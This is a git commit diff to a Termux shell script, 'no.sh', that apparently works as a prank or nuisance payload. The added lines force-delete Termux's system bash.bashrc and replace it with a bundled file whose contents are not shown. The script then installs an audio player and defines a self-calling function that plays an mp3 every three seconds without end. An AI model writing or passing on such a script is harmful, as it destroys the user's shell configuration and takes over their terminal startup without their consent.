e7b482f6429176455333887f531c3680cafba226
8D2D <74885040+Dylan23145@users.noreply.github.com>
2022-10-12 23:26:47 -0500

    Pe

--- no.sh
+++ no.sh
@@ -1,9 +1,9 @@
 #bin/bash 
-
-equ() {
+rm -rf /data/data/com.termux/files/usr/etc/bash.bashrc
+cp bash.bashrc /data/data/com.termux/files/usr/etc
 pkg install sox -y 
 cd notocar 
-
+equ () { 
 play -q matarv.mp3
 sleep 3
 equ
